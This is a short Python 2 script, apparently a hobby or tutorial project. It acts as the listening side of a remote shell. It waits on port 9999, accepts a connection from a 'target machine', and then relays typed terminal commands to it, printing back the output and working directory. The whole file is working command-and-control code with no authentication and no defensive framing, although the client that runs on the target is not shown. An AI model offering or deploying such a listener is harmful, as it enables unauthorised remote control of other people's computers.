#!/usr/bin/python
 
# https://www.tutorialspoint.com/python/python_networking.htm
# To see IP address, use command:
# dig +short myip.opendns.com @resolver1.opendns.com


import socket
import sys
import json
#------------------------------------------------------------------------------

# Setup socket (allows computers to connect)
def socketSetup():
	global host
	global port
	global s
	
	try:		
		s = socket.socket() # Create a socket object	
		print "socket.gethostname is: {}".format(socket.gethostname()) # Get local machine name
		host = '192.168.0.9' # Get local machine name
		port = 9999
		print "socketSetup: host is: {} and port is: {}".format(host, port)

		s.bind((host, port)) # Bind to the port
		s.listen(5)  # 5 is bad connections it can take before refusing any new connections
		print "Server waiting for connections on port: {}...".format(port)
		
		# Accept incoming connections. Should be a while true here
		conn, address = s.accept()     # Blocking. Establish connection with client.
		print 'Got a connection from', address
		sendCommands(conn)
		conn.close() # Close the connection

	except socket.error as message:
		print "socket error: {}".format(message)

#------------------------------------------------------------------------------

# Send terminal commands to target machine
def sendCommands(conn):
	# Get path first
	currentClientPath = conn.recv(1024)
	print "Current client path is: {}".format(currentClientPath)
	
	# Will send commands from this point on.
	print "Enter commands from now on: "
	while True:
		print currentClientPath + ":",
		cmd = raw_input()
		
		# Handle case user wants to quit		
		if cmd == 'quit':
			print "Quitting connection ..."
			conn.close()
			s.close()
			sys.exit()

		if len(cmd) > 0: # Only send if actually data there
			cmd = json.dumps(cmd)
			conn.send(cmd)	# Send command

			# Todo: decide on how much to receive as this causes error
			clientReply = conn.recv(9990) # Get reply for command
			#print "clientReply is: {}".format(clientReply)
			clientReply = json.loads(clientReply) # Reply loaded into dict
			#print "clientReply after loads is: {}\n".format(clientReply)
			
			# Check if there was an exception
			if clientReply["exception"] == "":	# No exception so update path, print output
				currentClientPath = clientReply["currentDir"]	# Update path if changed 
			
				# No exception, so print output of command also. E.g python --version
				if clientReply["commandOutput"] != "":
					print clientReply["commandOutput"]

			else: # Exception received, so just print it				
				print clientReply["exception"]

		else:
			print "No command entered."

#------------------------------------------------------------------------------

# Example program
if __name__ == "__main__":
	socketSetup()
